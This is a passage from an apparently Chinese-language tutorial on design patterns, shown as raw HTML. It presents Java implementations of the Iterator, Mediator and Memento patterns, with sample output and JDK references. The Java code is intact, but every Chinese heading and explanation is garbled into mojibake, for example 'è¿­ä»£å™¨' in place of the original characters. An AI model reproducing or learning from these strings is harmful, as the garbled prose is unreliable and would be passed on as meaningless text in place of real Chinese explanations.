</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><div><pre><code>true
false
</code></pre></div><h3 id="jdk-7" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/regex/Pattern.html" target="_blank" rel="noopener noreferrer">java.util.Pattern</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/text/Normalizer.html" target="_blank" rel="noopener noreferrer">java.text.Normalizer</a></li>
<li>All subclasses of <a href="http://docs.oracle.com/javase/8/docs/api/java/text/Format.html" target="_blank" rel="noopener noreferrer">java.text.Format</a></li>
<li><a href="http://docs.oracle.com/javaee/7/api/javax/el/ELResolver.html" target="_blank" rel="noopener noreferrer">javax.el.ELResolver</a></li>
</ul>
<h2 id="_4-è¿­ä»£å™¨-iterator" tabindex="-1"> 4. è¿­ä»£å™¨ï¼ˆIteratorï¼‰</h2>
<h3 id="intent-9" tabindex="-1"> Intent</h3>
<p>æä¾›ä¸€ç§é¡ºåºè®¿é—®èšåˆå¯¹è±¡å…ƒç´ çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸æš´éœ²èšåˆå¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚</p>
<h3 id="class-diagram-9" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Aggregate æ˜¯èšåˆç±»ï¼Œå…¶ä¸­ createIterator() æ–¹æ³•å¯ä»¥äº§ç”Ÿä¸€ä¸ª Iteratorï¼›</li>
<li>Iterator ä¸»è¦å®šä¹‰äº† hasNext() å’Œ next() æ–¹æ³•ã€‚</li>
<li>Client ç»„åˆäº† Aggregateï¼Œä¸ºäº†è¿­ä»£éå† Aggregateï¼Œä¹Ÿéœ€è¦ç»„åˆ Iteratorã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/89292ae1-5f13-44dc-b508-3f035e80bf89.png"/> </div><br>
<h3 id="implementation-9" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Aggregate</span> <span>{</span>
    <span>Iterator</span> <span>createIterator</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteAggregate</span> <span>implements</span> <span>Aggregate</span> <span>{</span>

    <span>private</span> <span>Integer</span><span>[</span><span>]</span> items<span>;</span>

    <span>public</span> <span>ConcreteAggregate</span><span>(</span><span>)</span> <span>{</span>
        items <span>=</span> <span>new</span> <span>Integer</span><span>[</span><span>10</span><span>]</span><span>;</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> items<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            items<span>[</span>i<span>]</span> <span>=</span> i<span>;</span>
        <span>}</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>Iterator</span> <span>createIterator</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteIterator</span><span><span>&lt;</span><span>Integer</span><span>></span></span><span>(</span>items<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>interface</span> <span>Iterator</span><span><span>&lt;</span><span>Item</span><span>></span></span> <span>{</span>

    <span>Item</span> <span>next</span><span>(</span><span>)</span><span>;</span>

    <span>boolean</span> <span>hasNext</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteIterator</span><span><span>&lt;</span><span>Item</span><span>></span></span> <span>implements</span> <span>Iterator</span> <span>{</span>

    <span>private</span> <span>Item</span><span>[</span><span>]</span> items<span>;</span>
    <span>private</span> <span>int</span> position <span>=</span> <span>0</span><span>;</span>

    <span>public</span> <span>ConcreteIterator</span><span>(</span><span>Item</span><span>[</span><span>]</span> items<span>)</span> <span>{</span>
        <span>this</span><span>.</span>items <span>=</span> items<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>Object</span> <span>next</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> items<span>[</span>position<span>++</span><span>]</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>boolean</span> <span>hasNext</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> position <span>&lt;</span> items<span>.</span>length<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Aggregate</span> aggregate <span>=</span> <span>new</span> <span>ConcreteAggregate</span><span>(</span><span>)</span><span>;</span>
        <span>Iterator</span><span><span>&lt;</span><span>Integer</span><span>></span></span> iterator <span>=</span> aggregate<span>.</span><span>createIterator</span><span>(</span><span>)</span><span>;</span>
        <span>while</span> <span>(</span>iterator<span>.</span><span>hasNext</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>iterator<span>.</span><span>next</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h3 id="jdk-8" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Iterator.html" target="_blank" rel="noopener noreferrer">java.util.Iterator</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Enumeration.html" target="_blank" rel="noopener noreferrer">java.util.Enumeration</a></li>
</ul>
<h2 id="_5-ä¸­ä»‹è€…-mediator" tabindex="-1"> 5. ä¸­ä»‹è€…ï¼ˆMediatorï¼‰</h2>
<h3 id="intent-10" tabindex="-1"> Intent</h3>
<p>é›†ä¸­ç›¸å…³å¯¹è±¡ä¹‹é—´å¤æ‚çš„æ²Ÿé€šå’Œæ§åˆ¶æ–¹å¼ã€‚</p>
<h3 id="class-diagram-10" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Mediatorï¼šä¸­ä»‹è€…ï¼Œå®šä¹‰ä¸€ä¸ªæ¥å£ç”¨äºä¸å„åŒäº‹ï¼ˆColleagueï¼‰å¯¹è±¡é€šä¿¡ã€‚</li>
<li>Colleagueï¼šåŒäº‹ï¼Œç›¸å…³å¯¹è±¡</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/30d6e95c-2e3c-4d32-bf4f-68128a70bc05.png"/> </div><br>
<h3 id="implementation-10" tabindex="-1"> Implementation</h3>
<p>Alarmï¼ˆé—¹é’Ÿï¼‰ã€CoffeePotï¼ˆå’–å•¡å£¶ï¼‰ã€Calendarï¼ˆæ—¥å†ï¼‰ã€Sprinklerï¼ˆå–·å¤´ï¼‰æ˜¯ä¸€ç»„ç›¸å…³çš„å¯¹è±¡ï¼Œåœ¨æŸä¸ªå¯¹è±¡çš„äº‹ä»¶äº§ç”Ÿæ—¶éœ€è¦å»æ“ä½œå…¶å®ƒå¯¹è±¡ï¼Œå½¢æˆäº†ä¸‹é¢è¿™ç§ä¾èµ–ç»“æ„ï¼š</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/82cfda3b-b53b-4c89-9fdb-26dd2db0cd02.jpg"/> </div><br>
<p>ä½¿ç”¨ä¸­ä»‹è€…æ¨¡å¼å¯ä»¥å°†å¤æ‚çš„ä¾èµ–ç»“æ„å˜æˆæ˜Ÿå½¢ç»“æ„ï¼š</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5359cbf5-5a79-4874-9b17-f23c53c2cb80.jpg"/> </div><br>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Colleague</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Alarm</span> <span>extends</span> <span>Colleague</span> <span>{</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"alarm"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doAlarm</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doAlarm()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>CoffeePot</span> <span>extends</span> <span>Colleague</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"coffeePot"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCoffeePot</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doCoffeePot()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Calender</span> <span>extends</span> <span>Colleague</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"calender"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCalender</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doCalender()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Sprinkler</span> <span>extends</span> <span>Colleague</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onEvent</span><span>(</span><span>Mediator</span> mediator<span>)</span> <span>{</span>
        mediator<span>.</span><span>doEvent</span><span>(</span><span>"sprinkler"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doSprinkler</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"doSprinkler()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Mediator</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>void</span> <span>doEvent</span><span>(</span><span>String</span> eventType<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteMediator</span> <span>extends</span> <span>Mediator</span> <span>{</span>
    <span>private</span> <span>Alarm</span> alarm<span>;</span>
    <span>private</span> <span>CoffeePot</span> coffeePot<span>;</span>
    <span>private</span> <span>Calender</span> calender<span>;</span>
    <span>private</span> <span>Sprinkler</span> sprinkler<span>;</span>

    <span>public</span> <span>ConcreteMediator</span><span>(</span><span>Alarm</span> alarm<span>,</span> <span>CoffeePot</span> coffeePot<span>,</span> <span>Calender</span> calender<span>,</span> <span>Sprinkler</span> sprinkler<span>)</span> <span>{</span>
        <span>this</span><span>.</span>alarm <span>=</span> alarm<span>;</span>
        <span>this</span><span>.</span>coffeePot <span>=</span> coffeePot<span>;</span>
        <span>this</span><span>.</span>calender <span>=</span> calender<span>;</span>
        <span>this</span><span>.</span>sprinkler <span>=</span> sprinkler<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>doEvent</span><span>(</span><span>String</span> eventType<span>)</span> <span>{</span>
        <span>switch</span> <span>(</span>eventType<span>)</span> <span>{</span>
            <span>case</span> <span>"alarm"</span><span>:</span>
                <span>doAlarmEvent</span><span>(</span><span>)</span><span>;</span>
                <span>break</span><span>;</span>
            <span>case</span> <span>"coffeePot"</span><span>:</span>
                <span>doCoffeePotEvent</span><span>(</span><span>)</span><span>;</span>
                <span>break</span><span>;</span>
            <span>case</span> <span>"calender"</span><span>:</span>
                <span>doCalenderEvent</span><span>(</span><span>)</span><span>;</span>
                <span>break</span><span>;</span>
            <span>default</span><span>:</span>
                <span>doSprinklerEvent</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doAlarmEvent</span><span>(</span><span>)</span> <span>{</span>
        alarm<span>.</span><span>doAlarm</span><span>(</span><span>)</span><span>;</span>
        coffeePot<span>.</span><span>doCoffeePot</span><span>(</span><span>)</span><span>;</span>
        calender<span>.</span><span>doCalender</span><span>(</span><span>)</span><span>;</span>
        sprinkler<span>.</span><span>doSprinkler</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCoffeePotEvent</span><span>(</span><span>)</span> <span>{</span>
        <span>// ...</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doCalenderEvent</span><span>(</span><span>)</span> <span>{</span>
        <span>// ...</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>doSprinklerEvent</span><span>(</span><span>)</span> <span>{</span>
        <span>// ...</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Alarm</span> alarm <span>=</span> <span>new</span> <span>Alarm</span><span>(</span><span>)</span><span>;</span>
        <span>CoffeePot</span> coffeePot <span>=</span> <span>new</span> <span>CoffeePot</span><span>(</span><span>)</span><span>;</span>
        <span>Calender</span> calender <span>=</span> <span>new</span> <span>Calender</span><span>(</span><span>)</span><span>;</span>
        <span>Sprinkler</span> sprinkler <span>=</span> <span>new</span> <span>Sprinkler</span><span>(</span><span>)</span><span>;</span>
        <span>Mediator</span> mediator <span>=</span> <span>new</span> <span>ConcreteMediator</span><span>(</span>alarm<span>,</span> coffeePot<span>,</span> calender<span>,</span> sprinkler<span>)</span><span>;</span>
        <span>// é—¹é’Ÿäº‹ä»¶åˆ°è¾¾ï¼Œè°ƒç”¨ä¸­ä»‹è€…å°±å¯ä»¥æ“ä½œç›¸å…³å¯¹è±¡</span>
        alarm<span>.</span><span>onEvent</span><span>(</span>mediator<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>doAlarm</span><span>(</span><span>)</span>
<span>doCoffeePot</span><span>(</span><span>)</span>
<span>doCalender</span><span>(</span><span>)</span>
<span>doSprinkler</span><span>(</span><span>)</span>
</code></pre></div><h3 id="jdk-9" tabindex="-1"> JDK</h3>
<ul>
<li>All scheduleXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/Timer.html" target="_blank" rel="noopener noreferrer">java.util.Timer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/Executor.html#execute-java.lang.Runnable-" target="_blank" rel="noopener noreferrer">java.util.concurrent.Executor#execute()</a></li>
<li>submit() and invokeXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ExecutorService.html" target="_blank" rel="noopener noreferrer">java.util.concurrent.ExecutorService</a></li>
<li>scheduleXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ScheduledExecutorService.html" target="_blank" rel="noopener noreferrer">java.util.concurrent.ScheduledExecutorService</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html#invoke-java.lang.Object-java.lang.Object...-" target="_blank" rel="noopener noreferrer">java.lang.reflect.Method#invoke()</a></li>
</ul>
<h2 id="_6-å¤‡å¿˜å½•-memento" tabindex="-1"> 6. å¤‡å¿˜å½•ï¼ˆMementoï¼‰</h2>
<h3 id="intent-11" tabindex="-1"> Intent</h3>
<p>åœ¨ä¸è¿åå°è£…çš„æƒ…å†µä¸‹è·å¾—å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œä»è€Œåœ¨éœ€è¦æ—¶å¯ä»¥å°†å¯¹è±¡æ¢å¤åˆ°æœ€åˆçŠ¶æ€ã€‚</p>
<h3 id="class-diagram-11" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Originatorï¼šåŸå§‹å¯¹è±¡</li>
<li>Caretakerï¼šè´Ÿè´£ä¿å­˜å¥½å¤‡å¿˜å½•</li>
<li>Menentoï¼šå¤‡å¿˜å½•ï¼Œå­˜å‚¨åŸå§‹å¯¹è±¡çš„çš„çŠ¶æ€ã€‚å¤‡å¿˜å½•å®é™…ä¸Šæœ‰ä¸¤ä¸ªæ¥å£ï¼Œä¸€ä¸ªæ˜¯æä¾›ç»™ Caretaker çš„çª„æ¥å£ï¼šå®ƒåªèƒ½å°†å¤‡å¿˜å½•ä¼ é€’ç»™å…¶å®ƒå¯¹è±¡ï¼›ä¸€ä¸ªæ˜¯æä¾›ç»™ Originator çš„å®½æ¥å£ï¼Œå…è®¸å®ƒè®¿é—®åˆ°å…ˆå‰çŠ¶æ€æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚ç†æƒ³æƒ…å†µæ˜¯åªå…è®¸ Originator è®¿é—®æœ¬å¤‡å¿˜å½•çš„å†…éƒ¨çŠ¶æ€ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/50678f34-694f-45a4-91c6-34d985c83fee.png"/> </div><br>
<h3 id="implementation-11" tabindex="-1"> Implementation</h3>
<p>ä»¥ä¸‹å®ç°äº†ä¸€ä¸ªç®€å•è®¡ç®—å™¨ç¨‹åºï¼Œå¯ä»¥è¾“å…¥ä¸¤ä¸ªå€¼ï¼Œç„¶åè®¡ç®—è¿™ä¸¤ä¸ªå€¼çš„å’Œã€‚å¤‡å¿˜å½•æ¨¡å¼å…è®¸å°†è¿™ä¸¤ä¸ªå€¼å­˜å‚¨èµ·æ¥ï¼Œç„¶ååœ¨æŸä¸ªæ—¶åˆ»ç”¨å­˜å‚¨çš„çŠ¶æ€è¿›è¡Œæ¢å¤ã€‚</p>
<p>å®ç°å‚è€ƒï¼š<a href="https://www.oodesign.com/memento-pattern-calculator-example-java-sourcecode.html" target="_blank" rel="noopener noreferrer">Memento Pattern - Calculator Example - Java Sourcecode</a></p>
<div><pre><code><span>/**
 * Originator Interface
 */</span>
<span>public</span> <span>interface</span> <span>Calculator</span> <span>{</span>

    <span>// Create Memento</span>
    <span>PreviousCalculationToCareTaker</span> <span>backupLastCalculation</span><span>(</span><span>)</span><span>;</span>

    <span>// setMemento</span>
    <span>void</span> <span>restorePreviousCalculation</span><span>(</span><span>PreviousCalculationToCareTaker</span> memento<span>)</span><span>;</span>

    <span>int</span> <span>getCalculationResult</span><span>(</span><span>)</span><span>;</span>

    <span>void</span> <span>setFirstNumber</span><span>(</span><span>int</span> firstNumber<span>)</span><span>;</span>

    <span>void</span> <span>setSecondNumber</span><span>(</span><span>int</span> secondNumber<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><div><pre><code><span>/**
 * Originator Implementation
 */</span>
<span>public</span> <span>class</span> <span>CalculatorImp</span> <span>implements</span> <span>Calculator</span> <span>{</span>

    <span>private</span> <span>int</span> firstNumber<span>;</span>
    <span>private</span> <span>int</span> secondNumber<span>;</span>

    <span>@Override</span>
    <span>public</span> <span>PreviousCalculationToCareTaker</span> <span>backupLastCalculation</span><span>(</span><span>)</span> <span>{</span>
        <span>// create a memento object used for restoring two numbers</span>
        <span>return</span> <span>new</span> <span>PreviousCalculationImp</span><span>(</span>firstNumber<span>,</span> secondNumber<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>restorePreviousCalculation</span><span>(</span><span>PreviousCalculationToCareTaker</span> memento<span>)</span> <span>{</span>
        <span>this</span><span>.</span>firstNumber <span>=</span> <span>(</span><span>(</span><span>PreviousCalculationToOriginator</span><span>)</span> memento<span>)</span><span>.</span><span>getFirstNumber</span><span>(</span><span>)</span><span>;</span>
        <span>this</span><span>.</span>secondNumber <span>=</span> <span>(</span><span>(</span><span>PreviousCalculationToOriginator</span><span>)</span> memento<span>)</span><span>.</span><span>getSecondNumber</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>int</span> <span>getCalculationResult</span><span>(</span><span>)</span> <span>{</span>
        <span>// result is adding two numbers</span>
        <span>return</span> firstNumber <span>+</span> secondNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>setFirstNumber</span><span>(</span><span>int</span> firstNumber<span>)</span> <span>{</span>
        <span>this</span><span>.</span>firstNumber <span>=</span> firstNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>setSecondNumber</span><span>(</span><span>int</span> secondNumber<span>)</span> <span>{</span>
        <span>this</span><span>.</span>secondNumber <span>=</span> secondNumber<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><div><pre><code><span>/**
 * Memento Interface to Originator
 *
 * This interface allows the originator to restore its state
 */</span>
<span>public</span> <span>interface</span> <span>PreviousCalculationToOriginator</span> <span>{</span>
    <span>int</span> <span>getFirstNumber</span><span>(</span><span>)</span><span>;</span>
    <span>int</span> <span>getSecondNumber</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>/**
 *  Memento interface to CalculatorOperator (Caretaker)
 */</span>
<span>public</span> <span>interface</span> <span>PreviousCalculationToCareTaker</span> <span>{</span>
    <span>// no operations permitted for the caretaker</span>
<span>}</span>
</code></pre></div><div><pre><code><span>/**
 * Memento Object Implementation
 * <span><span><span>&lt;</span>p</span><span>></span></span>
 * Note that this object implements both interfaces to Originator and CareTaker
 */</span>
<span>public</span> <span>class</span> <span>PreviousCalculationImp</span> <span>implements</span> <span>PreviousCalculationToCareTaker</span><span>,</span>
        <span>PreviousCalculationToOriginator</span> <span>{</span>

    <span>private</span> <span>int</span> firstNumber<span>;</span>
    <span>private</span> <span>int</span> secondNumber<span>;</span>

    <span>public</span> <span>PreviousCalculationImp</span><span>(</span><span>int</span> firstNumber<span>,</span> <span>int</span> secondNumber<span>)</span> <span>{</span>
        <span>this</span><span>.</span>firstNumber <span>=</span> firstNumber<span>;</span>
        <span>this</span><span>.</span>secondNumber <span>=</span> secondNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>int</span> <span>getFirstNumber</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> firstNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>int</span> <span>getSecondNumber</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> secondNumber<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><div><pre><code><span>/**
 * CareTaker object
 */</span>
<span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>// program starts</span>
        <span>Calculator</span> calculator <span>=</span> <span>new</span> <span>CalculatorImp</span><span>(</span><span>)</span><span>;</span>

        <span>// assume user enters two numbers</span>
        calculator<span>.</span><span>setFirstNumber</span><span>(</span><span>10</span><span>)</span><span>;</span>
        calculator<span>.</span><span>setSecondNumber</span><span>(</span><span>100</span><span>)</span><span>;</span>

        <span>// find result</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>calculator<span>.</span><span>getCalculationResult</span><span>(</span><span>)</span><span>)</span><span>;</span>

        <span>// Store result of this calculation in case of error</span>
        <span>PreviousCalculationToCareTaker</span> memento <span>=</span> calculator<span>.</span><span>backupLastCalculation</span><span>(</span><span>)</span><span>;</span>

        <span>// user enters a number</span>
        calculator<span>.</span><span>setFirstNumber</span><span>(</span><span>17</span><span>)</span><span>;</span>

        <span>// user enters a wrong second number and calculates result</span>
        calculator<span>.</span><span>setSecondNumber</span><span>(</span><span>-</span><span>290</span><span>)</span><span>;</span>

        <span>// calculate result</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>calculator<span>.</span><span>getCalculationResult</span><span>(</span><span>)</span><span>)</span><span>;</span>

        <span>// user hits CTRL + Z to undo last operation and see last result</span>
        calculator<span>.</span><span>restorePreviousCalculation</span><span>(</span>memento<span>)</span><span>;</span>

        <span>// result restored</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>calculator<span>.</span><span>getCalculationResult</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></div></div><div><pre><code>110
-273
110
